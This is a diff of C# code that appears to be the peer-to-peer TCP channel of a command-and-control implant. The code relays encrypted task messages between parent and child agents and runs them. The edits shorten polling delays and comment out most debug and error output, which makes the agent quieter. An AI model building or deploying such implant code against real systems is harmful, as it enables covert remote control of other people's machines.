@@ -200,7 +200,7 @@ namespace Engineer.Models
                 await client.ConnectAsync(Bindip, ServerPort);
                 if(client.Connected)
                 {
-                    Connect.Output = "Connected to client at " + Bindip.ToString() + ":" + ServerPort.ToString();
+                    Connect.Output = "Connected to client at " + Bindip + ":" + ServerPort;
                     //Console.WriteLine("parent connected to child");
                 }
                 IsDataInTransit = true;
@@ -315,7 +315,7 @@ namespace Engineer.Models
                         IsDataInTransit = true;
                         while (Program.IsEncrypted)
                         {
-                            Thread.Sleep(10);
+                            Thread.Sleep(5);
                         }
                         if (!Program.IsEncrypted)
                         {
@@ -342,7 +342,6 @@ namespace Engineer.Models
                             },
                                 IsBlocking = true
                             };
-                            Program.InboundCommandsRec += 1;
                             await Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
                             FirstCheckIn.firstCheckInDone = true;
                             IsDataInTransit = false;
@@ -368,7 +367,7 @@ namespace Engineer.Models
                         if (!Program.IsEncrypted)
                         {
                             byte[] ParentData = await client.ReceiveData(_tokenSource.Token); // should always be a C2TaskMessage[] , but the data is seralized & encrypted  NEED TO CHANGE so we can process this C2TaskMessage
-                            //Console.WriteLine($"{DateTime.Now} reading C2 Task from Parent");
+                            //Console.WriteLine($"{DateTime.UtcNow} reading C2 Task from Parent");
 
                             byte[] seralizedParentData = Encryption.AES_Decrypt(ParentData, Program.MessagePathKey);
                             C2TaskMessage incomingMessage = seralizedParentData.JsonDeserialize<C2TaskMessage>();
@@ -405,7 +404,7 @@ namespace Engineer.Models
                                 IsDataInTransit = true;
                                 while (Program.IsEncrypted)
                                 {
-                                    Thread.Sleep(10);
+                                    Thread.Sleep(5);
                                 }
                                // Console.WriteLine($"{DateTime.UtcNow} calling send data to parent");
                                 await client.SendData(ForwardedChildData, _tokenSource.Token);
@@ -413,14 +412,14 @@ namespace Engineer.Models
                         }
                         IsDataInTransit = false;
                     }
-                    await Task.Delay(10);
+                    await Task.Delay(5);
                 }
                 Console.WriteLine("Server While True Exited ERROR");
             }
             catch (Exception ex)
             {
-              //  Console.WriteLine(ex.Message);
-               // Console.WriteLine(ex.StackTrace);
+              //Console.WriteLine(ex.Message);
+              //Console.WriteLine(ex.StackTrace);
             } 
         }
 
@@ -463,7 +462,6 @@ namespace Engineer.Models
                             },
                                 IsBlocking = true
                             };
-                            Program.InboundCommandsRec += 1;
                             Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
                             byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                             client.SendData(Id, _tokenSource.Token);
@@ -574,8 +572,8 @@ namespace Engineer.Models
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+                //Console.WriteLine(e.Message);
+                //Console.WriteLine(e.StackTrace);
             }
             return false;
         }
@@ -609,8 +607,8 @@ namespace Engineer.Models
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+                //Console.WriteLine(e.Message);
+                //Console.WriteLine(e.StackTrace);
             }
             return null;
         }
@@ -622,15 +620,15 @@ namespace Engineer.Models
                 if (client.Connected)
                 {
                     var ns = client.GetStream();
-                    Console.WriteLine($"{DateTime.UtcNow} sending data length {data.Length}");
+                   // Console.WriteLine($"{DateTime.UtcNow} sending data length {data.Length}");
                     await ns.WriteAsync(data, 0, data.Length, token);
                 }
 
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+               // Console.WriteLine(e.Message);
+              //  Console.WriteLine(e.StackTrace);
             }
         }
 
